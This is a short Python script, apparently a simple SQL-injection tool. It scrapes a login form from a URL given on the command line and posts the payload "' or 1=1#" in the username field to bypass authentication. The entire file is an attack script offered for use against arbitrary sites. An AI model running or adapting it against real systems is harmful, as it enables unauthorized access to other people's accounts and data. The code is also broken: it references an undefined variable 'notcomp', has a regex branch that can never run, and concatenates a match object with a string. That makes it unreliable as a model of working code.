# 

import sys
import requests
from bs4 import BeautifulSoup # beautifulsoup4 module
import re

def help():
    #
    # ./sql-injection url
    #
    #
    print('Usage: ./sql-injection url')
    sys.exit(1)

if(len(sys.argv)!=2):
    help()

url = str(sys.argv[1])

# Get request
r = requests.get(url).text
soup = BeautifulSoup(r, 'html.parser')

# Find next page, id and pw(transmit via POST method)
form_tag = soup.form
action_page = form_tag.get('action')

# general url regex : ^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})\/([a-z1-9\.-]+)
re_allpath = re.compile('^(https?:\/\/)?')
allpath = re_allpath.match(action_page)
if allpath == None: # url + action_page
    re_path = re.compile('^(https?:\/\/)?([\da-z\.-]+)([a-z\.]{2,6})\/([a-z1-9\.-]+)')
    path = notcomp.match(action_page).group()
    next_url = path + '/' + action_page
    print("\nAction page = " + path)
    print("\nNext URL = " + next_url)
else:
    print("\nAction page = " + allpath)
    next_url = allpath

id_value = soup.select('form input')[0]['name']
pw_value = soup.select('form input')[1]['name']
print("ID = " + id_value + "\nPW = " + pw_value)

# SQL Injection ... here ...
sqlinjection = "\' or 1=1#"
params = {id_value:sqlinjection, pw_value:'dontcare'}

# Send post packet
resp = requests.post(next_url, data=params)
print(resp.text)



# .com
# ^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})
# .com/login
# ^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})\/([a-z1-9\.-]+)
